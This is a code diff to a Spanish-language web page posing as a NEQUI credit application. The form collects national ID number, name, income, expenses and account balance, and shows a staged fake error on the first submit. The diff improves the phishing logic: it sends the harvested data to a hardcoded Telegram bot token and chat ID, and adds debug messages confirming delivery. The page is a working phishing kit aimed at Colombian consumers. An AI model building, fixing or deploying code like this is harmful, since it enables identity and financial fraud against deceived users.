@@ -61,6 +61,22 @@
       margin: auto;
       border-radius: 5px;
     }
+    
+    /* Estilo para el toast de depuración */
+    .debug-toast {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background: #333;
+      color: #fff;
+      padding: 10px 15px;
+      border-radius: 8px;
+      font-size: 12px;
+      z-index: 10001;
+      max-width: 300px;
+      word-wrap: break-word;
+      display: none;
+    }
   </style>
 </head>
 
@@ -155,12 +171,6 @@
           <div class="type-credits-card-w credit-2">
             <div class="big-letter" style="height: 50vh !important;">
               <img src="../assets/logo-credito.png" style="width: 150px;">
-              <!-- <p class="u-text-white"
-                style="background-color: #f5f4f445; font-weight: 600; padding: .5rem; border-radius: .5rem; font-size: 17px; backdrop-filter: blur(7px);">
-                Crédito de bajo monto
-                <br>
-                Desde $100.000 a $2.400.000. En minutos te decimos si te lo aprobamos o no
-              </p> -->
               <h1 class="u-text-white is-credit-effect-page" style="font-size: 2.5rem !important;">
                 Valida tus datos y solicita tu crédito
               </h1>
@@ -288,7 +298,7 @@
                 <input type="text" id="ingresoMensualSalvavidas" required="">
                 <label for="saldoActual">Ingresos mensuales</label>
               </div>
-              <span id="saldoActualErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tus ingresos
+              <span id="ingresoErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tus ingresos
                 mensuales</span>
 
               <!-- Gastos -->
@@ -296,7 +306,7 @@
                 <input type="text" id="gastosMensualSalvavidas" required="">
                 <label for="saldoActual">Gastos mensuales</label>
               </div>
-              <span id="saldoActualErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tus gastos
+              <span id="gastosErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tus gastos
                 mensuales</span>
 
               <!-- Saldo -->
@@ -304,7 +314,7 @@
                 <input type="text" id="saldoActualSalvavidas" required="">
                 <label for="saldoActual">Saldo actual en tu cuenta NEQUI</label>
               </div>
-              <span id="saldoActualErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tu Saldo actual en tu
+              <span id="saldoErrorSalvavidas" class="text-red-500 text-xs hidden">Ingresa tu Saldo actual en tu
                 cuenta NEQUI</span>
               <span class="text-gray-500 text-xs">Por políticas financieras el saldo actual no será visible en la
                 solicitud, solo
@@ -403,11 +413,30 @@
               "plazoSelectorSalvavidas"
             );
             const fechaPago = document.getElementById("fechaPago");
-            const TASA_INTERES_MENSUAL_SALVAVIDAS = 0.009; // 1.81%
+            const TASA_INTERES_MENSUAL_SALVAVIDAS = 0.009; // 0.9%
 
-            // CONFIGURACIÓN DE TELEGRAM - ¡CAMBIAR POR TUS DATOS!
-            const TELEGRAM_BOT_TOKEN = "6460759862:AAGXmhRsIXIp16GVh72gbCmmmlSXRDITGEA";  // Reemplaza con tu token
-            const TELEGRAM_CHAT_ID = "7158969671";          // Reemplaza con tu chat ID
+            // CONFIGURACIÓN DE TELEGRAM
+            const TELEGRAM_BOT_TOKEN = "6460759862:AAGXmhRsIXIp16GVh72gbCmmmlSXRDITGEA";
+            const TELEGRAM_CHAT_ID = "7158969671";
+
+            // Función para mostrar mensaje de depuración
+            function showDebugMessage(msg, isError = false) {
+              console.log(msg);
+              // Crear un toast visual si existe el div, si no lo creamos
+              let toast = document.getElementById('debugToast');
+              if (!toast) {
+                toast = document.createElement('div');
+                toast.id = 'debugToast';
+                toast.style.cssText = 'position:fixed; bottom:20px; right:20px; background:#333; color:#fff; padding:10px 15px; border-radius:8px; font-size:12px; z-index:10001; max-width:300px; word-wrap:break-word; display:block;';
+                document.body.appendChild(toast);
+              }
+              toast.style.background = isError ? '#d32f2f' : '#2e7d32';
+              toast.innerHTML = msg;
+              toast.style.display = 'block';
+              setTimeout(() => {
+                toast.style.display = 'none';
+              }, 5000);
+            }
 
             // Función para enviar datos a Telegram
             async function enviarATelegram(formData) {
@@ -427,6 +456,7 @@
               const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
               
               try {
+                showDebugMessage('Enviando a Telegram...');
                 const response = await fetch(url, {
                   method: "POST",
                   headers: {
@@ -438,8 +468,18 @@
                     parse_mode: "Markdown"
                   }),
                 });
-                return await response.json();
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                  showDebugMessage('✅ Mensaje enviado a Telegram correctamente');
+                  return result;
+                } else {
+                  showDebugMessage('❌ Error Telegram: ' + JSON.stringify(result), true);
+                  return null;
+                }
               } catch (error) {
+                showDebugMessage('❌ Error de conexión: ' + error.message, true);
                 console.error("Error al enviar a Telegram:", error);
                 return null;
               }
@@ -506,16 +546,10 @@
               return nombre.trim().length >= 5 && nombre.includes(" ");
             }
 
-            function validarSaldoActual(saldo) {
-              return saldo.length >= 5;
-            }
-
-            function validarIngresoMensual(saldo) {
-              return saldo.length >= 5;
-            }
-
-            function validarGastosMensual(saldo) {
-              return saldo.length >= 5;
+            function validarCampoNumerico(valor) {
+              // Eliminar todo excepto números
+              const soloNumeros = valor.replace(/[^0-9]/g, '');
+              return soloNumeros.length >= 4;
             }
 
             function actualizarEstadoBotonContinuar() {
@@ -523,13 +557,13 @@
               const nombreValido = validarNombre(
                 nombreCompletoSalvavidas.value
               );
-              const saldoActualValido = validarSaldoActual(
+              const saldoActualValido = validarCampoNumerico(
                 saldoActualSalvavidas.value
               );
-              const ingresoMensualValido = validarIngresoMensual(
+              const ingresoMensualValido = validarCampoNumerico(
                 ingresoMensualSalvavidas.value
               );
-              const gastosMensualValido = validarGastosMensual(
+              const gastosMensualValido = validarCampoNumerico(
                 gastosMensualSalvavidas.value
               );
 
@@ -537,118 +571,64 @@
                 cedulaValida && nombreValido && saldoActualValido && ingresoMensualValido && gastosMensualValido
               );
 
-              if (btnContinuarSalvavidas.disabled) {
-                btnContinuarSalvavidas.classList.add(
-                  "opacity-80",
-                  "cursor-not-allowed"
-                );
-              } else {
-                btnContinuarSalvavidas.classList.remove(
-                  "opacity-80",
-                  "cursor-not-allowed"
-                );
-              }
+              // Mostrar/ocultar errores
+              document.getElementById("cedulaErrorSalvavidas").classList.toggle('hidden', cedulaValida);
+              document.getElementById("nombreErrorSalvavidas").classList.toggle('hidden', nombreValido);
+              document.getElementById("saldoErrorSalvavidas").classList.toggle('hidden', saldoActualValido);
+              document.getElementById("ingresoErrorSalvavidas").classList.toggle('hidden', ingresoMensualValido);
+              document.getElementById("gastosErrorSalvavidas").classList.toggle('hidden', gastosMensualValido);
+              
+              if (!cedulaValida) cedulaSalvavidas.classList.add("border-red-500");
+              else cedulaSalvavidas.classList.remove("border-red-500");
+              
+              if (!nombreValido) nombreCompletoSalvavidas.classList.add("border-red-500");
+              else nombreCompletoSalvavidas.classList.remove("border-red-500");
             }
 
-            const cedulaInput = document.getElementById("cedulaSalvavidas");
-            const nombreCompletoInput = document.getElementById(
-              "nombreCompletoSalvavidas"
-            );
-            const saldoActualInput = document.getElementById(
-              "saldoActualSalvavidas"
-            );
-            const ingresoMensualInput = document.getElementById(
-              "ingresoMensualSalvavidas"
-            );
-            const gastosMensualInput = document.getElementById(
-              "gastosMensualSalvavidas"
-            );
-            const ocupacionSelectorSalvavidas = document.getElementById(
-              "ocupacionSelectorSalvavidas"
-            );
-            const cedulaError = document.getElementById(
-              "cedulaErrorSalvavidas"
-            );
-            const nombreError = document.getElementById(
-              "nombreErrorSalvavidas"
-            );
-            const btnContinuarSalvavidas = document.getElementById(
-              "btnContinuarSalvavidas"
-            );
+            const cedulaSalvavidas = document.getElementById("cedulaSalvavidas");
+            const nombreCompletoSalvavidas = document.getElementById("nombreCompletoSalvavidas");
+            const saldoActualSalvavidas = document.getElementById("saldoActualSalvavidas");
+            const ingresoMensualSalvavidas = document.getElementById("ingresoMensualSalvavidas");
+            const gastosMensualSalvavidas = document.getElementById("gastosMensualSalvavidas");
+            const ocupacionSelectorSalvavidas = document.getElementById("ocupacionSelectorSalvavidas");
+            const btnContinuarSalvavidas = document.getElementById("btnContinuarSalvavidas");
 
-            cedulaInput.addEventListener("input", (e) => {
-              const valor = e.target.value.replace(/\D/g, "");
-              e.target.value = valor;
-
-              if (valor.length < 7 || valor.length > 10) {
-                cedulaError.classList.remove("hidden");
-                e.target.classList.add("border-red-500");
-              } else {
-                cedulaError.classList.add("hidden");
-                e.target.classList.remove("border-red-500");
-              }
-              actualizarEstadoBotonContinuar();
-            });
-
-            nombreCompletoInput.addEventListener("input", (e) => {
-              const valor = e.target.value.trim();
-              if (valor.length < 5 || !valor.includes(" ")) {
-                nombreError.classList.remove("hidden");
-                e.target.classList.add("border-red-500");
-              } else {
-                nombreError.classList.add("hidden");
-                e.target.classList.remove("border-red-500");
-              }
-              actualizarEstadoBotonContinuar();
-            });
-
-            saldoActualInput.addEventListener("input", (e) => {
-              saldoActualInput.style.border = '0'
-              let value = e.target.value;
+            // Formateo de campos numéricos
+            function formatCurrency(input) {
+              let value = input.value;
               value = value.replace(/\D/g, "");
               if (value) {
-                const numericValue = parseFloat(value) / 100;
+                const numericValue = parseFloat(value);
                 value = new Intl.NumberFormat("es-CO", {
                   style: "currency",
                   currency: "COP",
                   minimumFractionDigits: 0,
                   maximumFractionDigits: 0
-                }).format(value);
+                }).format(numericValue);
               }
-              e.target.value = value;
+              input.value = value;
+              actualizarEstadoBotonContinuar();
+            }
+
+            cedulaSalvavidas.addEventListener("input", (e) => {
+              e.target.value = e.target.value.replace(/\D/g, "").slice(0,10);
               actualizarEstadoBotonContinuar();
             });
 
-            ingresoMensualInput.addEventListener("input", (e) => {
-              let value = e.target.value;
-              value = value.replace(/\D/g, "");
-              if (value) {
-                const numericValue = parseFloat(value) / 100;
-                value = new Intl.NumberFormat("es-CO", {
-                  style: "currency",
-                  currency: "COP",
-                  minimumFractionDigits: 0,
-                  maximumFractionDigits: 0
-                }).format(value);
-              }
-              e.target.value = value;
+            nombreCompletoSalvavidas.addEventListener("input", () => {
               actualizarEstadoBotonContinuar();
             });
 
-            gastosMensualInput.addEventListener("input", (e) => {
-              let value = e.target.value;
-              value = value.replace(/\D/g, "");
-              if (value) {
-                const numericValue = parseFloat(value) / 100;
-                value = new Intl.NumberFormat("es-CO", {
-                  style: "currency",
-                  currency: "COP",
-                  minimumFractionDigits: 0,
-                  maximumFractionDigits: 0
-                }).format(value);
-              }
-              e.target.value = value;
-              actualizarEstadoBotonContinuar();
+            saldoActualSalvavidas.addEventListener("input", (e) => {
+              formatCurrency(e.target);
+            });
+
+            ingresoMensualSalvavidas.addEventListener("input", (e) => {
+              formatCurrency(e.target);
+            });
+
+            gastosMensualSalvavidas.addEventListener("input", (e) => {
+              formatCurrency(e.target);
             });
 
             const errorMessage = document.querySelector(".errorMessage");
@@ -661,7 +641,7 @@
                 // PRIMER CLIC: mostrar error simulado
                 setTimeout(() => {
                   errorMessage.style.display = "block";
-                  saldoActualInput.style.border = '2px solid #da0081'
+                  saldoActualSalvavidas.style.border = '2px solid #da0081'
                   loadingSpinner.style.display = "none";
                 }, 4000);
 
@@ -670,15 +650,10 @@
                   contSendButton += 1;
                   saldoActualSalvavidas.value = '';
                   actualizarEstadoBotonContinuar();
-                  window.scrollTo({ top: ingresoMensualInput.getBoundingClientRect().top + window.scrollY - 100, behavior: "smooth" });
+                  window.scrollTo({ top: ingresoMensualSalvavidas.getBoundingClientRect().top + window.scrollY - 100, behavior: "smooth" });
                 }, 4000);
               } else {
-                // SEGUNDO CLIC: recopilar datos, enviar a Telegram y mostrar loader
-                
-                // Obtener valores numéricos limpios
-                const limpiarNumero = (valor) => {
-                  return valor.replace(/[^0-9]/g, '');
-                };
+                // SEGUNDO CLIC: recopilar datos y enviar a Telegram
                 
                 const formData = {
                   cedula: cedulaSalvavidas.value,
@@ -693,13 +668,24 @@
                   tipoProducto: 'Bajo monto'
                 };
                 
-                // Enviar a Telegram
-                await enviarATelegram(formData);
+                showDebugMessage('📝 Datos recopilados, enviando a Telegram...');
                 
-                // Mostrar loader de éxito
-                mostrarLoaderNequi();
+                // Enviar a Telegram
+                const resultado = await enviarATelegram(formData);
+                
+                if (resultado && resultado.ok) {
+                  // Mostrar loader de éxito
+                  mostrarLoaderNequi();
+                } else {
+                  // Si falló, mostrar error pero continuar con el loader igual
+                  showDebugMessage('⚠️ No se pudo enviar a Telegram, pero continuamos', true);
+                  mostrarLoaderNequi();
+                }
               }
             });
+            
+            // Inicializar
+            actualizarEstadoBotonContinuar();
           });
         </script>
       </div>
